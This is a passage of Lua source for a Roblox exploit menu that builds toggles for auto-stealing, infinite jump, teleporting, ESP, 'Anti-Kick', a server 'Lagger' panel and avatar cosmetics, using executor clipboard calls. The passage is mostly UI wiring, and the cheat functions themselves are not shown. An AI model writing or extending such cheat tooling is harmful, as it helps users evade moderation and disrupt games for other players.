    M.setAutoSwingVisual = setAutoSwing
    


    uiSectionHeader(PMech, "STEAL")
    local stealModeLabels = {"Normal", "V2", "Semi"}
    local function stealLabelToMode(lab)
        if lab == "V2" then return "V2" end
        if lab == "Semi" then return "Semi" end
        return "Normal"
    end
    local function stealModeToLabel(mode)
        if mode == "V2" then return "V2" end
        if mode == "Semi" then return "Semi" end
        return "Normal"
    end
    local stealDefaultIdx = 1
    do
        local lab = stealModeToLabel(M.stealMode)
        for i, v in ipairs(stealModeLabels) do if v == lab then stealDefaultIdx = i break end end
    end

    local _, setAutoSteal, setStealModeUI, regStealSettings = uiExpandToggleRow(
        PMech,
        "Auto Steal",
        M.Steal.AutoStealEnabled,
        stealModeLabels,
        stealDefaultIdx,
        function(on)
            M.Steal.AutoStealEnabled = on
            if on then M.startAutoSteal() else M.stopAutoSteal() end
        end,
        function(newLabel)
            local oldMode = M.stealMode
            M.stealMode = stealLabelToMode(newLabel)
            if oldMode ~= M.stealMode and M.Steal.AutoStealEnabled then
                M.stopAutoSteal(); M.startAutoSteal()
            end
            M.updateStatusRadius()
        end
    )
    M.setInstaGrab = setAutoSteal
    M.setStealModeUI = setStealModeUI

    
    local v1Box = Instance.new("Frame"); v1Box.BackgroundTransparency=1; v1Box.Size=UDim2.new(1,0,0,0); v1Box.AutomaticSize=Enum.AutomaticSize.Y
    local v1Lay = Instance.new("UIListLayout"); v1Lay.Padding=UDim.new(0,6); v1Lay.Parent=v1Box
    local _, srBox = uiNumberRow(v1Box, "Grab Radius", M.Steal.StealRadius, 0.5, 300, function(v)
        M.Steal.StealRadius = v; M.setStealRadius(v); M.updateStatusRadius()
    end)
    M.radInput = srBox
    local _, sdBox = uiNumberRow(v1Box, "Hold Duration", M.Steal.StealDuration, 0.1, 10, function(v)
        M.Steal.StealDuration = v
    end)
    M.durationBox = sdBox
    local _, setAutoRadius = uiToggleRow(v1Box, "Auto Radius", M.autoRadiusEnabled, function(on)
        M.autoRadiusEnabled = on; M.updateStatusRadius()
    end)
    M.setAutoRadiusVisual = setAutoRadius
    regStealSettings("Normal", v1Box)
    regStealSettings("V2", v1Box)

    
    local v2Box = Instance.new("Frame"); v2Box.BackgroundTransparency=1; v2Box.Size=UDim2.new(1,0,0,0); v2Box.AutomaticSize=Enum.AutomaticSize.Y
    local v2Lay = Instance.new("UIListLayout"); v2Lay.Padding=UDim.new(0,6); v2Lay.Parent=v2Box
    local _, semiRadBox = uiNumberRow(v2Box, "Semi Radius (max 10)", math.min(M.Semi.radius,10), 0.5, 10, function(v)
        M.Semi.radius = math.min(v,10)
        if semiRadBox then semiRadBox.Text = tostring(M.Semi.radius) end
    end)
    M.semiRadInput = semiRadBox
    local _, semiHoldMin = uiNumberRow(v2Box, "Hold Min", M.Semi.holdMin or 1.3, 0.1, 5, function(v) M.Semi.holdMin = v end)
    local _, semiHoldMax = uiNumberRow(v2Box, "Hold Max", M.Semi.holdMax or 2.6, 0.1, 8, function(v) M.Semi.holdMax = v end)
    regStealSettings("Semi", v2Box)

    
    local v3Box = Instance.new("Frame"); v3Box.BackgroundTransparency=1; v3Box.Size=UDim2.new(1,0,0,0); v3Box.AutomaticSize=Enum.AutomaticSize.Y
    local v3Lay = Instance.new("UIListLayout"); v3Lay.Padding=UDim.new(0,6); v3Lay.Parent=v3Box
    local _, v3Rad = uiNumberRow(v3Box, "Grab Radius", M.Steal.StealRadius, 0.5, 300, function(v)
        M.Steal.StealRadius = v; M.setStealRadius(v); M.updateStatusRadius()
    end)
    local _, v3Dur = uiNumberRow(v3Box, "Fill Duration", M.Steal.StealDuration, 0.1, 10, function(v)
        M.Steal.StealDuration = v
    end)
    
    do
        local r = Instance.new("Frame")
        r.ClipsDescendants = true
        r.Size = UDim2.new(1, 0, 0, 46)
        r.BackgroundColor3 = UI_ROW_BG
        r.BackgroundTransparency = 0.1
        r.BorderSizePixel = 0
        r.Parent = v3Box
        uiCardStyle(r)
        local l = Instance.new("TextLabel")
        l.Position = UDim2.new(0, 14, 0, 0)
        l.Size = UDim2.new(0.42, 0, 1, 0)
        l.BackgroundTransparency = 1
        l.Text = "Stop Time (s)"
        l.TextColor3 = UI_TEXT_PRIMARY
        l.TextSize = 13
        l.Font = Enum.Font.GothamMedium
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = r

        local function clampStop(n)
            n = tonumber(n) or 0.35
            return math.clamp(n, 0.1, 30)
        end

        local box = Instance.new("TextBox")
        box.Name = "StopTimeBox"
        box.Position = UDim2.new(1, -118, 0.5, -13)
        box.Size = UDim2.new(0, 52, 0, 26)
        box.BackgroundColor3 = UI_BTN_BG
        box.BorderSizePixel = 0
        box.Text = string.format("%.2f", clampStop(M.Steal.StopTime))
        box.TextColor3 = UI_TEXT_PRIMARY
        box.TextSize = 12
        box.Font = Enum.Font.GothamBold
        box.ClearTextOnFocus = false
        box.Parent = r
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 7)

        local function applyStop(n)
            n = clampStop(n)
            M.Steal.StopTime = n
            box.Text = string.format("%.2f", n)
            saveCherryConfig()
        end

        box.FocusLost:Connect(function()
            applyStop(box.Text)
        end)

        local minus = uiSmallBtn({
            Parent = r, Pos = UDim2.new(1, -158, 0.5, -13), Size = UDim2.new(0, 28, 0, 26),
            Text = "-", Col = UI_TEXT_PRIMARY, TS = 14, CR = 7
        })
        local plus = uiSmallBtn({
            Parent = r, Pos = UDim2.new(1, -54, 0.5, -13), Size = UDim2.new(0, 28, 0, 26),
            Text = "+", Col = UI_TEXT_PRIMARY, TS = 14, CR = 7
        })
        minus.MouseButton1Click:Connect(function()
            applyStop((tonumber(M.Steal.StopTime) or 0.35) - 0.25)
        end)
        plus.MouseButton1Click:Connect(function()
            applyStop((tonumber(M.Steal.StopTime) or 0.35) + 0.25)
        end)

        M.stopTimeBox = box
    end
    local _, setAutoRadius3 = uiToggleRow(v3Box, "Auto Radius", M.autoRadiusEnabled, function(on)
        M.autoRadiusEnabled = on; M.updateStatusRadius()
    end)
    regStealSettings("V3", v3Box)

    local _, sbBox = uiNumberRow(PMech, "Steal Bar Size", M.stealBarSize, 100, 900, function(v)
        M.stealBarSize = v; M.buildStatusUI()
    end)

    uiSectionHeader(PMech, "MOTION")
    local _, setInfJump = uiToggleRow(PMech, "Infinite Jump", M.infJumpEnabled, function(on)
        M.infJumpEnabled = on
        M.infJumpMode = "hold"
        if on then
            M.stopManualInfJumpLoop()
            M.startHoldInfJump()
        else
            M.stopManualInfJumpLoop()
            M.stopHoldInfJump()
        end
    end)
    M.setInfJumpVisual = setInfJump
    M.setJumpModeUI = nil


    local _, setMirrorTP = uiToggleRow(PMech, "Mirror TP Down", true, function(on)
        M.setMirrorTPDown(on)
        saveCherryConfig()
    end)
    M.setMirrorTPVisual = setMirrorTP

    local _, setAL = uiToggleRow(PMech, "Auto Left", M.autoLeftEnabled, function(on)
        if on then
            if M.autoBatEnabled then M.stopBatAimbot(); if M.autoBatSetVisual then M.autoBatSetVisual(false) end end
            if M.autoRightEnabled then M.stopAutoRight(); if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end end
            if M.autoPlayEnabled then M.stopAutoPlay() end
            M.startAutoLeft()
        else
            M.stopAutoLeft()
        end
        if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
        saveCherryConfig()
    end)
    M.autoLeftSetVisual = setAL

    local _, setAR = uiToggleRow(PMech, "Auto Right", M.autoRightEnabled, function(on)
        if on then
            if M.autoBatEnabled then M.stopBatAimbot(); if M.autoBatSetVisual then M.autoBatSetVisual(false) end end
            if M.autoLeftEnabled then M.stopAutoLeft(); if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end end
            if M.autoPlayEnabled then M.stopAutoPlay() end
            M.startAutoRight()
        else
            M.stopAutoRight()
        end
        if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
        saveCherryConfig()
    end)
    M.autoRightSetVisual = setAR

    local _, setATP = uiToggleRow(PMech, "Auto TP Down", M.autoTPEnabled, function(on)
        M.autoTPEnabled = on
        if on then M.startAutoTP() else M.stopAutoTP() end
    end)
    M.setAutoTPVisual = setATP

    local _, tpHBox = uiNumberRow(PMech, "TP Height", M.autoTPHeight, 1, 100, function(v) M.autoTPHeight = v end)
    M.autoTPHeightBox = tpHBox

    
    uiSectionHeader(PVis, "SKY & VISION")
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PVis; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.55,0,1,0)
        l.BackgroundTransparency=1; l.Text="Sky Theme"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local skyLbl = Instance.new("TextLabel"); skyLbl.Position=UDim2.new(0.55,0,0,0); skyLbl.Size=UDim2.new(0.45,-10,1,0)
        skyLbl.BackgroundTransparency=1; skyLbl.Text=M.currentSkyTheme; skyLbl.TextColor3=UI_ACCENT; skyLbl.Font=Enum.Font.GothamBold; skyLbl.TextSize=12; skyLbl.TextXAlignment=Enum.TextXAlignment.Right; skyLbl.Parent=r
        local skyIdx = 1
        for i,t in ipairs(M.SkyOrder) do if t == M.currentSkyTheme then skyIdx = i; break end end
        local btn = Instance.new("TextButton",r); btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1; btn.Text=""
        btn.Activated:Connect(function()
            skyIdx = skyIdx % #M.SkyOrder + 1
            local t = M.SkyOrder[skyIdx]
            skyLbl.Text = t; M.currentSkyTheme = t; M.CandyApplyCustomSky(t); saveCherryConfig()
        end)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PVis; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.55,0,1,0)
        l.BackgroundTransparency=1; l.Text="FOV"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local fovLbl = Instance.new("TextLabel"); fovLbl.Position=UDim2.new(0.55,0,0,0); fovLbl.Size=UDim2.new(0.45,-10,1,0)
        fovLbl.BackgroundTransparency=1; fovLbl.Text=tostring(M.fovValue); fovLbl.TextColor3=UI_ACCENT; fovLbl.Font=Enum.Font.GothamBold; fovLbl.TextSize=12; fovLbl.TextXAlignment=Enum.TextXAlignment.Right; fovLbl.Parent=r
        local fovIdx = 1
        local btn = Instance.new("TextButton",r); btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1; btn.Text=""
        btn.Activated:Connect(function()
            fovIdx = fovIdx % #M.fovOptions + 1
            M.fovValue = M.fovOptions[fovIdx]; fovLbl.Text = tostring(M.fovValue); M.applyFOV(); saveCherryConfig()
        end)
    end

    uiSectionHeader(PVis, "BACKGROUND")
    uiActionRow(PVis, "Custom Background", function()
        M.openImagePicker("bg")
    end)
    uiActionRow(PVis, "Mobile Button Images", function()
        M.openImagePicker("mob")
    end)

    uiSectionHeader(PVis, "ESP")
    local _, setLineESP = uiToggleRow(PVis, "Line ESP", M.lineESPEnabled, function(on)
        M.lineESPEnabled = on; cherryESPState.LineESP = on
    end)
    local _, setSpeedESP = uiToggleRow(PVis, "Speed ESP", M.speedESPEnabled, function(on)
        M.speedESPEnabled = on; cherryESPState.SpeedESP = on
    end)

    
    uiSectionHeader(PUtil, "MISC")
    

    local _, setAntiLag = uiToggleRow(PUtil, "Anti-Lag", M.antiLagEnabled, function(on)
        M.antiLagEnabled = on
        if on then M.enableAntiLag() else M.disableAntiLag() end
        saveCherryConfig()
    end)
    M.setAntiLagVisual = setAntiLag

    local _, setNuke = uiToggleRow(PUtil, "Nuke Optimizer", M.nukeOptEnabled == true, function(on)
        M.nukeOptEnabled = on
        if on then M.enableNukeOptimizer() else M.disableNukeOptimizer() end
        saveCherryConfig()
    end)
    M.setNukeOptimizerVisual = setNuke


    local _, setUltra = uiToggleRow(PUtil, "Ultra Mode", M.ultraModeEnabled, function(on)
        M.ultraModeEnabled = on
        if on then M.enableUltraMode() else M.disableUltraMode() end
        if M.setUltraModeVisual then M.setUltraModeVisual(on) end
        saveCherryConfig()
    end)
    M.setUltraModeVisual = setUltra

    local _, setAntiSummer = uiToggleRow(PUtil, "Anti Summer Base", M.antiSummerBaseEnabled, function(on)
        M.antiSummerBaseEnabled = on
        if on then M.enableAntiSummerBase() else M.disableAntiSummerBase() end
        saveCherryConfig()
    end)
    M.setAntiSummerVisual = setAntiSummer

    local _, setStretch = uiToggleRow(PUtil, "Stretch Rez", M.stretchRezEnabled, function(on)
        M.stretchRezEnabled = on
        if on then M.enableStretchRez() else M.disableStretchRez() end
    end)
    M.setStretchRezVisual = setStretch

    local _, setRemoveAcc = uiToggleRow(PUtil, "Remove Accessories", M.removeAccEnabled, function(on)
        M.removeAccEnabled = on
        if on then M.startRemoveAcc() else M.stopRemoveAcc() end
    end)

    local _, setAntiKick = uiToggleRow(PUtil, "Anti-Kick", M.antiKickEnabled, function(on)
        M.antiKickEnabled = on
        if on then M.enableAntiKick() else M.disableAntiKick() end
        saveCherryConfig()
    end)
    M.antiKickSetVisual = setAntiKick

    local _, setSafeMode = uiToggleRow(PUtil, "Safe Mode", M.safeModeEnabled, function(on)
        M.safeModeEnabled = on
        if on then M.enableSafeMode() else M.disableSafeMode() end
        saveCherryConfig()
    end)
    M.setSafeModeVisual = setSafeMode

    do
        local fontIdx = 1
        for i, n in ipairs(M.FONT_NAMES) do
            if n == (M.customFontSelected or "None") then fontIdx = i break end
        end
        local _, setFontUI = uiChoiceRow(PUtil, "Custom Font", M.FONT_NAMES, fontIdx, function(v)
            M.applyCustomFont(v)
            saveCherryConfig()
        end)
    end

    local _, setIntro = uiToggleRow(PUtil, "Intro Song", M.introSoundEnabled, function(on)
        M.introSoundEnabled = on
        if not on and introSoundInstance and introSoundInstance.IsPlaying then
            pcall(function() introSoundInstance:Stop() end)
        end
    end)

    local _, setIntroGUI = uiToggleRow(PUtil, "Intro GUI", M.introGUIEnabled, function(on)
        M.introGUIEnabled = on
    end)

    local _, setMobBtns = uiToggleRow(PUtil, "Mobile Buttons", M.mobileButtonsEnabled, function(on)
        M.mobileButtonsEnabled = on
        if on then M.buildMobileButtons() else M.destroyMobileButtons() end
        saveCherryConfig()
    end)

    do
        local shapeOpts = {"Normal", "Circle"}
        local shapeIdx = 1
        for i, n in ipairs(shapeOpts) do
            if n == (M.mobileButtonShape or "Normal") then shapeIdx = i break end
        end
        local _, setShapeUI = uiChoiceRow(PUtil, "Button Shape", shapeOpts, shapeIdx, function(v)
            M.mobileButtonShape = v
            M.circleButtonsEnabled = (v == "Circle")
            if M.mobileButtonsEnabled then M.buildMobileButtons() end
            saveCherryConfig()
        end)
        M.setCircleBtnsVisual = function(on)
            
            if on then
                M.mobileButtonShape = "Circle"
                M.circleButtonsEnabled = true
            elseif M.mobileButtonShape == "Circle" then
                M.mobileButtonShape = "Normal"
                M.circleButtonsEnabled = false
            end
            if setShapeUI then setShapeUI(M.mobileButtonShape) end
            if M.mobileButtonsEnabled then M.buildMobileButtons() end
        end
    end

    local _, btnSzBox = uiNumberRow(PUtil, "Button Size", M.mobileButtonsSize, 40, 150, function(v)
        M.mobileButtonsSize = v
        if M.mobileButtonsEnabled then M.buildMobileButtons() end
    end)

    local _, menuScaleBox = uiNumberRow(PUtil, "Menu Scale", M.uiScale, 0.5, 2.0, function(v)
        M.uiScale = v
        if M.uiScaleRef then M.uiScaleRef.Scale = v end
        saveCherryConfig()
    end)

    uiActionRow(PUtil, "Reset Mobile Positions", function() M.resetMobilePositions() end)

    uiSectionHeader(PUtil, "CHARTER")
    local packNames = {}
    for name in pairs(M.PACKS) do table.insert(packNames, name) end
    table.sort(packNames)

    local packDefaultIdx = 1
    for i,v in ipairs(packNames) do if v == M.animPack then packDefaultIdx = i break end end
    local _, setAnimPackToggle, setPackUI = uiExpandToggleRow(
        PUtil,
        "Animation Pack",
        M.animPackEnabled,
        packNames,
        packDefaultIdx,
        function(on)
            M.animPackEnabled = on
            if on then M.applyAnimPack(M.animPack)
            else local char=player.Character; if char then M.resetAnimations(char) end end
            saveCherryConfig()
        end,
        function(v)
            M.animPack = v
            if M.animPackEnabled then M.applyAnimPack(v) end
            saveCherryConfig()
        end
    )
    M.setPackModeUI = setPackUI

    uiActionRow(PUtil, "Apply Animation Pack", function()
        if M.animPackEnabled then M.applyAnimPack(M.animPack) end
        saveCherryConfig()
    end)

    local _, setHeadless = uiToggleRow(PUtil, "Headless", M.headlessEnabled, function(on)
        M.headlessEnabled = on
        M.applyHeadlessToChar(player.Character, on)
        saveCherryConfig()
    end)
    local _, setKorblox = uiToggleRow(PUtil, "Korblox", M.korbloxEnabled, function(on)
        M.korbloxEnabled = on
        M.applyKorbloxToChar(player.Character, on)
        saveCherryConfig()
    end)

    uiSectionHeader(PUtil, "SKIN & ACCESSORIES")
    local _, setSkinKeep = uiToggleRow(PUtil, "Keep Skin on Respawn", M.skinKeepOnRespawn ~= false, function(on)
        M.skinKeepOnRespawn = on
        saveCherryConfig()
    end)
    M.setSkinKeepVisual = setSkinKeep

    
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(0.28,0,1,0)
        l.BackgroundTransparency=1; l.Text="Accessory ID"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local box = Instance.new("TextBox")
        box.Position = UDim2.new(0.30, 0, 0.5, -13)
        box.Size = UDim2.new(0, 110, 0, 26)
        box.BackgroundColor3 = UI_BTN_BG
        box.BorderSizePixel = 0
        box.Text = ""
        box.PlaceholderText = "Asset ID"
        box.TextColor3 = UI_TEXT_PRIMARY
        box.TextSize = 12
        box.Font = Enum.Font.GothamBold
        box.ClearTextOnFocus = false
        box.Parent = r
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 7)
        local addBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-140,0.5,-13), Size=UDim2.new(0,62,0,26),
            Text="ADD", Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=UI_ACCENT, STr=0.3})
        local clrBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-70,0.5,-13), Size=UDim2.new(0,58,0,26),
            Text="CLEAR", Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=Color3.fromRGB(180,40,40), STr=0.35})
        addBtn.MouseButton1Click:Connect(function()
            local id = tonumber(box.Text)
            if not id then
                addBtn.Text = "BAD ID"
                task.delay(0.9, function() if addBtn and addBtn.Parent then addBtn.Text = "ADD" end end)
                return
            end
            local ok = M.addCustomAccessoryId(id)
            addBtn.Text = ok and "OK" or "FAIL"
            box.Text = ""
            saveCherryConfig()
            task.delay(0.9, function() if addBtn and addBtn.Parent then addBtn.Text = "ADD" end end)
        end)
        clrBtn.MouseButton1Click:Connect(function()
            M.clearAllCustomAccessories()
            saveCherryConfig()
            clrBtn.Text = "DONE"
            task.delay(0.9, function() if clrBtn and clrBtn.Parent then clrBtn.Text = "CLEAR" end end)
        end)
        M.accIdBox = box
    end

    
    do
        local function vynxCopyText(str)
            str = tostring(str or "")
            local ok = false
            if setclipboard then ok = pcall(function() setclipboard(str) end) end
            if not ok and toclipboard then ok = pcall(function() toclipboard(str) end) end
            if not ok and typeof(Clipboard) == "table" and Clipboard.set then
                ok = pcall(function() Clipboard.set(str) end)
            end
            return ok
        end

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 22)
        title.BackgroundTransparency = 1
        title.Text = "PRESET ACCESSORIES"
        title.TextColor3 = UI_TEXT_DIM or Color3.fromRGB(160,160,170)
        title.Font = Enum.Font.GothamBold
        title.TextSize = 11
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.Parent = PUtil

        M.presetAccessoryOn = M.presetAccessoryOn or {}
        for _, preset in ipairs(M.ACCESSORY_PRESETS or {}) do
            local pid = preset.id
            local key = tostring(pid)
            local isOn = M.presetAccessoryOn[key] == true

            local r = Instance.new("Frame")
            r.ClipsDescendants = true
            r.Size = UDim2.new(1, 0, 0, 46)
            r.BackgroundColor3 = UI_ROW_BG
            r.BackgroundTransparency = 0.03
            r.BorderSizePixel = 0
            r.Parent = PUtil
            uiCardStyle(r)

            local nameLbl = Instance.new("TextLabel")
            nameLbl.Position = UDim2.new(0, 12, 0, 0)
            nameLbl.Size = UDim2.new(0, 52, 1, 0)
            nameLbl.BackgroundTransparency = 1
            nameLbl.Text = preset.name
            nameLbl.TextColor3 = UI_TEXT_PRIMARY
            nameLbl.Font = Enum.Font.GothamMedium
            nameLbl.TextSize = 12
            nameLbl.TextXAlignment = Enum.TextXAlignment.Left
            nameLbl.Parent = r

            
            local idBox = Instance.new("TextBox")
            idBox.Position = UDim2.new(0, 64, 0.5, -12)
            idBox.Size = UDim2.new(0, 118, 0, 24)
            idBox.BackgroundColor3 = UI_BTN_BG
            idBox.BorderSizePixel = 0
            idBox.Text = tostring(pid)
            idBox.TextColor3 = UI_ACCENT or (M.Theme and M.Theme.Accent) or Color3.fromRGB(255, 255, 255)
            idBox.Font = Enum.Font.GothamBold
            idBox.TextSize = 11
            idBox.ClearTextOnFocus = false
            idBox.TextEditable = false
            idBox.Parent = r
            Instance.new("UICorner", idBox).CornerRadius = UDim.new(0, 6)
            idBox.Focused:Connect(function()
                pcall(function() idBox.CursorPosition = #idBox.Text + 1; idBox.SelectionStart = 1 end)
            end)

            local copyBtn = uiSmallBtn({
                Parent = r,
                Pos = UDim2.new(1, -148, 0.5, -12),
                Size = UDim2.new(0, 52, 0, 24),
                Text = "COPY",
                Col = UI_TEXT_PRIMARY,
                TS = 10,
                CR = 6,
                SC = UI_ACCENT,
                STr = 0.3,
            })
            copyBtn.MouseButton1Click:Connect(function()
                local ok = vynxCopyText(tostring(pid))
                copyBtn.Text = ok and "COPIED" or "FAIL"
                task.delay(0.9, function()
                    if copyBtn and copyBtn.Parent then copyBtn.Text = "COPY" end
                end)
            end)

            local togBtn = uiSmallBtn({
                Parent = r,
                Pos = UDim2.new(1, -88, 0.5, -12),
                Size = UDim2.new(0, 76, 0, 24),
                Text = isOn and "ON" or "OFF",
                Col = UI_TEXT_PRIMARY,
                TS = 11,
                CR = 6,
                SC = isOn and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(80, 80, 90),
                STr = 0.25,
            })
            togBtn.MouseButton1Click:Connect(function()
                local nowOn = not (M.presetAccessoryOn[key] == true)
                M.setPresetAccessory(pid, nowOn)
                togBtn.Text = nowOn and "ON" or "OFF"
                pcall(function()
                    local st = togBtn:FindFirstChildOfClass("UIStroke")
                    if st then
                        st.Color = nowOn and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(80, 80, 90)
                    end
                end)
                saveCherryConfig()
            end)
        end

        uiActionRow(PUtil, "Copy ALL Asset IDs", function()
            local parts = {}
            for _, preset in ipairs(M.ACCESSORY_PRESETS or {}) do
                table.insert(parts, tostring(preset.id))
            end
            local all = table.concat(parts, "\n")
            local ok = vynxCopyText(all)
            
            print(ok and "[VYNX] Copied all accessory IDs" or "[VYNX] Clipboard not available — select ID boxes manually")
        end)

        uiActionRow(PUtil, "Enable ALL Presets", function()
            for _, preset in ipairs(M.ACCESSORY_PRESETS or {}) do
                M.setPresetAccessory(preset.id, true)
            end
            saveCherryConfig()
        end)
        uiActionRow(PUtil, "Disable ALL Presets", function()
            for _, preset in ipairs(M.ACCESSORY_PRESETS or {}) do
                M.setPresetAccessory(preset.id, false)
            end
            saveCherryConfig()
        end)
    end

    uiActionRow(PUtil, "Re-Apply Accessories", function()
        M.clearVynxAccessories(player.Character)
        task.wait(0.05)
        M.applyAllCustomAccessories(player.Character)
        M.applyCustomClothing(player.Character)
    end)

    
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(0.28,0,1,0)
        l.BackgroundTransparency=1; l.Text="Shirt ID"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local box = Instance.new("TextBox")
        box.Position = UDim2.new(0.30, 0, 0.5, -13)
        box.Size = UDim2.new(0, 110, 0, 26)
        box.BackgroundColor3 = UI_BTN_BG
        box.BorderSizePixel = 0
        box.Text = M.customShirtId and tostring(M.customShirtId) or ""
        box.PlaceholderText = "Shirt Asset"
        box.TextColor3 = UI_TEXT_PRIMARY
        box.TextSize = 12
        box.Font = Enum.Font.GothamBold
        box.ClearTextOnFocus = false
        box.Parent = r
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 7)
        local applyBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-70,0.5,-13), Size=UDim2.new(0,58,0,26),
            Text="APPLY", Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=UI_ACCENT, STr=0.3})
        applyBtn.MouseButton1Click:Connect(function()
            local id = tonumber(box.Text)
            if id and id > 0 then
                M.customShirtId = id
                M.applyCustomClothing(player.Character)
                applyBtn.Text = "OK"
            else
                M.customShirtId = nil
                applyBtn.Text = "CLR"
            end
            saveCherryConfig()
            task.delay(0.9, function() if applyBtn and applyBtn.Parent then applyBtn.Text = "APPLY" end end)
        end)
        M.shirtIdBox = box
    end

    
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(0.28,0,1,0)
        l.BackgroundTransparency=1; l.Text="Pants ID"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local box = Instance.new("TextBox")
        box.Position = UDim2.new(0.30, 0, 0.5, -13)
        box.Size = UDim2.new(0, 110, 0, 26)
        box.BackgroundColor3 = UI_BTN_BG
        box.BorderSizePixel = 0
        box.Text = M.customPantsId and tostring(M.customPantsId) or ""
        box.PlaceholderText = "Pants Asset"
        box.TextColor3 = UI_TEXT_PRIMARY
        box.TextSize = 12
        box.Font = Enum.Font.GothamBold
        box.ClearTextOnFocus = false
        box.Parent = r
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 7)
        local applyBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-70,0.5,-13), Size=UDim2.new(0,58,0,26),
            Text="APPLY", Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=UI_ACCENT, STr=0.3})
        applyBtn.MouseButton1Click:Connect(function()
            local id = tonumber(box.Text)
            if id and id > 0 then
                M.customPantsId = id
                M.applyCustomClothing(player.Character)
                applyBtn.Text = "OK"
            else
                M.customPantsId = nil
                applyBtn.Text = "CLR"
            end
            saveCherryConfig()
            task.delay(0.9, function() if applyBtn and applyBtn.Parent then applyBtn.Text = "APPLY" end end)
        end)
        M.pantsIdBox = box
    end



    uiSectionHeader(PUtil, "PANELS")
    local _, setPingPanel = uiToggleRow(PUtil, "VYNX PING Panel", M.pingPanelOpen == true, function(on)
        M.setPingPanelOpen(on)
    end)
    M.setPingPanelVisual = setPingPanel

    local _, setVynxLaggerPanel = uiToggleRow(PUtil, "VYNX LAGGER 2.1 Panel", M.vynxLaggerPanelOpen == true, function(on)
        M.setVynxLaggerPanelOpen(on)
    end)
    M.setVynxLaggerPanelVisual = setVynxLaggerPanel

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Save Config"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local sBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="SAVE", Col=Color3.fromRGB(200,200,200), TS=12, CR=6, SC=Color3.fromRGB(40,40,40), STr=0.2})
        sBtn.Activated:Connect(function()
            saveCherryConfig()
            sBtn.Text = "OK"
            task.delay(0.8, function() if sBtn and sBtn.Parent then sBtn.Text = "SAVE" end end)
        end)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
